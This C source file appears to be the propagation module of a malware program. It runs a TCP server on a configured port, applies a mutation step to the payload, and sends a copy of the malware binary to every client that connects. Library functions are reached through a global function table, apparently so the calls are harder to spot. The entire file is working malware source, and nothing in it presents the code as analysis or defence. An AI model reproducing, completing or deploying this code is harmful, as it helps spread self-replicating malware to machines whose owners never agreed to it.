#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>

#include "propagate.h"
#include "utils.h"

#define SA struct sockaddr

void* handle_connection(void*varg);
void start_server();
int propagate(Globals *global);

void* handle_connection(void*varg)
{
    int cfd = *(int*)varg;

    mutate_lib(global);
    global->write(cfd, global->malware_copy, sizeof(char) * global->malware_size);
    global->close(cfd);
    global->pthread_exit(NULL);
    return NULL;
}

void start_server(){
    int sockfd, connfd, len;
    struct sockaddr_in servaddr, cli;

    sockfd = global->socket(AF_INET, SOCK_STREAM, 0);
    if(sockfd == -1){
        DEBUG_LOG_ERR("[PROP] Socket creation failed...\n");
        global->exit(0);
    }
    else{
        DEBUG_LOG("[PROP] Socket successfully created...\n");
    }

    // Assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = global->htonl(INADDR_ANY);
    servaddr.sin_port = global->htons(global->propagation_server_port);

    int yes=1;
    if(global->setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &yes, sizeof(yes)) == -1){
        DEBUG_LOG_ERR("[PROP] Setsockopt failed...\n");
        global->exit(0);
    }

    if((global->bind(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr))) != 0){
        DEBUG_LOG_ERR("[PROP] Socket bind failed...\n");
        global->exit(0);
    }else{
        DEBUG_LOG("[PROP] Socket bind successful...\n");
    }

    if((global->listen(sockfd, 5)) != 0){
        DEBUG_LOG_ERR("[PROP] Listen failed...\n");
        global->exit(0);
    }else{
        DEBUG_LOG("[PROP] Server listening...\n");
    }

    len = sizeof(cli);
    while(1){
        connfd = global->accept(sockfd, (struct sockaddr*)&cli, &len);
        if(connfd < 0){
            DEBUG_LOG_ERR("[PROP] Server accept failed...\n");
            global->exit(0);
        }
        DEBUG_LOG("[PROP] Client connected!\n");
        
        pthread_t thread_id;
        global->pthread_create(&thread_id, NULL, handle_connection, &connfd);
    }
    global->close(sockfd);
}

int propagate(Globals *glob){
    global = glob;
    start_server();
    return 1;
}
